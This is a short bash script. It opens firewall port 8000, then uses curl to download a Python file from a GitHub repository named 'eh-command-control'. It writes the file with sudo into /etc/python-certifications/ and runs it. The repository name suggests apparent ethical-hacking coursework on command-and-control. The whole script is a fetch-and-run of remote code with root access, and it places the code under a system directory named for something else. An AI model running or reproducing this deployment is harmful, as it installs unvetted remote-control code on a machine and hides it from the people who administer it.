#!/bin/bash
firewall-cmd --add-port=8000/tcp
firewall-cmd --reload  
curl -fsSL --retry 3 https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py \
  | sudo tee /etc/python-certifications/week4.py > /dev/null
python /etc/python-certifications/week4.py
